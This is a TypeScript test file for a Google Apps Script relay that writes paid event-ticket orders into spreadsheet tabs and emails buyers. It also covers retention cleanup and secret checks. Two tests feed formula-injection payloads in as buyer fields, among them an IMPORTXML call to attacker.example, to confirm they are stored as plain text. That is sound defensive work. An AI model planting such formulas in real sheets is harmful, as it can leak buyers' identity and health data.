import { test } from "node:test";
import assert from "node:assert/strict";
import { loadRelayScript, type RelayHarness } from "./helpers/sheets.ts";
import type { RelayPayload } from "../src/lib/relay.ts";
import { liveSheetUrl, sheetTabName } from "../src/lib/sheet.ts";

/**
 * The Apps Script relay, exercised with the exact payload `src/lib/relay.ts`
 * builds. These two files talk to each other across a copy-paste boundary — the
 * script is pasted into a Google account by hand — so nothing but a test keeps
 * the contract honest.
 */

function order(harness: RelayHarness, over: Partial<RelayPayload> = {}): RelayPayload {
  return {
    version: 2,
    channels: ["sheet", "email"],
    secret: harness.secret,
    order_id: "ord_" + Math.random().toString(16).slice(2),
    paid_at: "2026-10-04 21:14:02",
    locale: "ca",
    buyer_name: "Marc Puig",
    buyer_email: "marc@example.com",
    buyer_phone: "600111222",
    activity: "Mediportaventura",
    activity_display: "Mediportaventura",
    edition: "Tardor 2026",
    edition_ends_at: "2026-10-05T01:00:00.000Z",
    field_labels: ["DNI", "Al·lèrgies"],
    field_classifications: { DNI: "identity", "Al·lèrgies": "health" },
    payment_method: "stripe",
    total_eur: 45.3,
    ticket_url_base: "https://xivarri.cat/ca/t/",
    items: [
      {
        ticket_code: "K7M2X9",
        item: "Amb bus",
        quantity: 1,
        unit_price_eur: 45,
        answers: { DNI: "12345678Z", "Al·lèrgies": "cap" },
      },
    ],
    ...over,
  };
}

test("a paid order becomes one row on its activity-and-edition tab, plus an email", () => {
  const relay = loadRelayScript();
  const result = relay.post(order(relay));

  assert.equal(result.ok, true);
  assert.equal(result.pestanya, "Mediportaventura — Tardor 2026");

  const row = relay.sheet("Mediportaventura — Tardor 2026")!.row(2);
  assert.equal(row.codi, "K7M2X9");
  assert.equal(row.comprador, "Marc Puig");
  assert.equal(row.DNI, "12345678Z");
  assert.equal(row.enllac, "https://xivarri.cat/ca/t/K7M2X9");

  assert.equal(relay.mails.length, 1);
  assert.equal(relay.mails[0].to, "marc@example.com");
  // The code has to be readable before the buyer opens anything.
  assert.ok(relay.mails[0].subject.includes("K7M2X9"));
});

test("the canonical activity name keeps every locale on one tab", () => {
  const relay = loadRelayScript();
  relay.post(order(relay, {
    locale: "es",
    activity: "Viatge",
    activity_display: "Viaje",
  }));

  assert.ok(relay.sheet("Viatge — Tardor 2026"));
  assert.equal(relay.sheet("Viaje — Tardor 2026"), undefined);
  assert.match(relay.mails[0].subject, /Tu entrada para Viaje/);
});

test("daily retention clears sensitive columns after the edition", () => {
  const relay = loadRelayScript();
  relay.post(order(relay, {
    edition_ends_at: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
  }));

  relay.runRetentionCleanup();
  const row = relay.sheet("Mediportaventura — Tardor 2026")!.row(2);
  assert.equal(row.DNI, "");
  assert.equal(row["Al·lèrgies"], "");
  assert.equal(row.comprador, "Marc Puig");
});

test("daily retention removes the edition sheet after twelve months", () => {
  const relay = loadRelayScript();
  relay.post(order(relay, { edition_ends_at: "2020-01-01T00:00:00.000Z" }));

  relay.runRetentionCleanup();
  assert.equal(relay.sheet("Mediportaventura — Tardor 2026"), undefined);
});

test("a Stripe retry writes nothing twice", () => {
  const relay = loadRelayScript();
  const payload = order(relay);

  relay.post(payload);
  const retry = relay.post(payload);

  // OK, not an error: Stripe must stop retrying.
  assert.equal(retry.ok, true);
  assert.equal(retry.duplicat, true);
  assert.equal(relay.sheet("Mediportaventura — Tardor 2026")!.getLastRow(), 2);
  assert.equal(relay.mails.length, 1);
});

test("a failed email retries without duplicating the sheet row", () => {
  const relay = loadRelayScript();
  const payload = order(relay);
  relay.failNextMail();

  const first = relay.post(payload);
  assert.equal((first.sheet as { sent: boolean }).sent, true);
  assert.equal((first.email as { sent: boolean }).sent, false);
  assert.equal(relay.sheet("Mediportaventura — Tardor 2026")!.getLastRow(), 2);

  const retry = relay.post({ ...payload, channels: ["email"] });
  assert.equal((retry.email as { sent: boolean }).sent, true);
  assert.equal(relay.sheet("Mediportaventura — Tardor 2026")!.getLastRow(), 2);
  assert.equal(relay.mails.length, 1);
});

test("the wrong secret gets nothing, and leaves no tab behind", () => {
  const relay = loadRelayScript();
  const result = relay.post(order(relay, { secret: "guessed" }));

  assert.equal(result.ok, false);
  assert.equal(result.error, "no autoritzat");
  assert.equal(relay.sheet("Mediportaventura — Tardor 2026"), undefined);
});

test("a request without the secret never takes the lock", () => {
  const relay = loadRelayScript();
  // The /exec address is public. If junk could hold the lock, a flood of it
  // would make real Stripe deliveries answer "ocupat".
  relay.post(order(relay, { secret: "guessed" }));
  relay.post({ order_id: "ord_x" });
  assert.equal(relay.locksTaken(), 0);

  relay.post(order(relay));
  assert.equal(relay.locksTaken(), 1);
});

test("a script with no secret property refuses everything", () => {
  const relay = loadRelayScript();
  relay.forgetSecret();
  // Even a payload carrying the "right" value: an empty property must never
  // turn into "anything goes".
  const result = relay.post(order(relay));
  assert.equal(result.ok, false);
  assert.equal(result.error, "no autoritzat");
  assert.equal(relay.mails.length, 0);
});

test("an order with no items answers OK and sends no email", () => {
  const relay = loadRelayScript();
  const result = relay.post(order(relay, { items: [] }));

  assert.equal(result.ok, true);
  assert.equal(relay.mails.length, 0);
});

test("a question added mid-sale becomes a new column, and old rows still line up", () => {
  const relay = loadRelayScript();
  relay.post(order(relay));

  relay.post(
    order(relay, {
      field_labels: ["DNI", "Al·lèrgies", "Parada de bus"],
      items: [
        {
          ticket_code: "TT44RR",
          item: "Amb bus",
          quantity: 1,
          unit_price_eur: 45,
          answers: { DNI: "87654321X", "Al·lèrgies": "gluten", "Parada de bus": "Girona" },
        },
      ],
    }),
  );

  const sheet = relay.sheet("Mediportaventura — Tardor 2026")!;
  const headers = sheet.headers();
  assert.equal(headers[headers.length - 1], "Parada de bus");
  assert.equal(sheet.row(2).codi, "K7M2X9");
  assert.equal(sheet.row(2)["Parada de bus"], "");
  assert.equal(sheet.row(3)["Parada de bus"], "Girona");
});

test("an activity with no edition uses its bare title as the tab name", () => {
  const relay = loadRelayScript();
  relay.post(order(relay, { activity: "Medifutbol", edition: "", field_labels: [] }));

  assert.ok(relay.sheet("Medifutbol"));
});

test("a formula typed into a buyer field lands as text", () => {
  const relay = loadRelayScript();
  // The sheet holds DNIs and allergies; a name that evaluates itself the moment
  // an organiser opens the tab is a way out for all of it.
  relay.post(
    order(relay, {
      buyer_name: '=IMPORTXML("https://attacker.example/x","//a")',
      items: [
        {
          ticket_code: "ZZ11QQ",
          item: "General",
          quantity: 1,
          unit_price_eur: 5,
          answers: { DNI: "+34600111222", "Al·lèrgies": "cap" },
        },
      ],
    }),
  );

  const row = relay.sheet("Mediportaventura — Tardor 2026")!.row(2);
  assert.ok(String(row.comprador).startsWith("'="));
  assert.ok(String(row.DNI).startsWith("'+"));
  // Dates and plain numbers must survive untouched, or the sheet stops sorting.
  assert.equal(row.pagat_el, "2026-10-04 21:14:02");
  assert.equal(row.preu_eur, 5);
});

test("leading whitespace and control characters do not smuggle a formula past", () => {
  const relay = loadRelayScript();
  relay.post(
    order(relay, {
      buyer_name: "\t=HYPERLINK(\"https://attacker.example\")",
      buyer_phone: "  +34600111222",
      items: [
        {
          ticket_code: "ZZ22QQ",
          item: "General",
          quantity: 1,
          unit_price_eur: 5,
          answers: { DNI: "\r\n@SUM(A1)", "Al·lèrgies": " ＝1+1" },
        },
      ],
    }),
  );

  const row = relay.sheet("Mediportaventura — Tardor 2026")!.row(2);
  assert.equal(row.comprador, "'=HYPERLINK(\"https://attacker.example\")");
  assert.equal(row.telefon, "'+34600111222");
  assert.equal(row.DNI, "'@SUM(A1)");
  assert.equal(row["Al·lèrgies"], "'＝1+1");
});

test("buyer-written columns are set to plain text before they are written", () => {
  const relay = loadRelayScript();
  relay.post(order(relay));

  const sheet = relay.sheet("Mediportaventura — Tardor 2026")!;
  for (const header of ["comprador", "correu", "telefon", "modalitat", "DNI", "Al·lèrgies"]) {
    assert.equal(sheet.formatAt(2, header), "@", `${header} should be plain text`);
  }
  // Prices, units and dates stay automatic so the sheet can still sum and sort.
  for (const header of ["preu_eur", "unitats", "pagat_el"]) {
    assert.equal(sheet.formatAt(2, header), undefined, `${header} should stay automatic`);
  }
});

test("an activity with more questions than a new sheet has columns still writes", () => {
  const relay = loadRelayScript();
  const labels = Array.from({ length: 30 }, (_, i) => `Pregunta ${i + 1}`);
  const answers = Object.fromEntries(labels.map((label, i) => [label, `resposta ${i}`]));

  const result = relay.post(
    order(relay, {
      activity: "Enquesta",
      field_labels: labels,
      items: [
        { ticket_code: "QQ99WW", item: "General", quantity: 1, unit_price_eur: 1, answers },
      ],
    }),
  );

  assert.equal(result.ok, true);
  assert.equal(relay.sheet("Enquesta — Tardor 2026")!.row(2)["Pregunta 30"], "resposta 29");
});

test("the Sales screen names the same tab the script creates", () => {
  const relay = loadRelayScript();

  // The admin is told which tab to open; the script decides what it is called.
  // The two live either side of a copy-paste boundary, so they are compared here.
  const cases: Array<[string, string | null]> = [
    ["Medifutbol", "Tardor 2026"],
    ["Medifutbol", ""],
    ["Medifutbol", null],
    ["XIVARRI x Mirona Run Club", "Primavera 2027"],
    ["Sortida 3/4: [bus] o *sense*", "Tardor 2026"],
    ["A".repeat(120), "Tardor 2026"],
  ];

  for (const [activity, edition] of cases) {
    assert.equal(
      sheetTabName(activity, edition),
      relay.tabNameFromScript(activity, edition),
      `disagreed on ${JSON.stringify([activity, edition])}`,
    );
  }
});

test("the Sales screen accepts the sheet as a bare id or a pasted URL", () => {
  const id = "1AbCdEfGhIjKlMnOpQrStUvWxYz_0123-456789";
  const canonical = `https://docs.google.com/spreadsheets/d/${id}/edit`;

  assert.equal(liveSheetUrl(id), canonical);
  assert.equal(liveSheetUrl(`  ${id}  `), canonical);
  assert.equal(liveSheetUrl(`https://docs.google.com/spreadsheets/d/${id}/edit#gid=0`), canonical);
  assert.equal(liveSheetUrl(`https://docs.google.com/spreadsheets/d/${id}`), canonical);

  // Missing or nonsense: no link at all, rather than a link to the wrong place.
  assert.equal(liveSheetUrl(undefined), null);
  assert.equal(liveSheetUrl(""), null);
  assert.equal(liveSheetUrl("canvia-aixo"), null);
  assert.equal(liveSheetUrl("https://example.com/spreadsheets/d/short"), null);
});
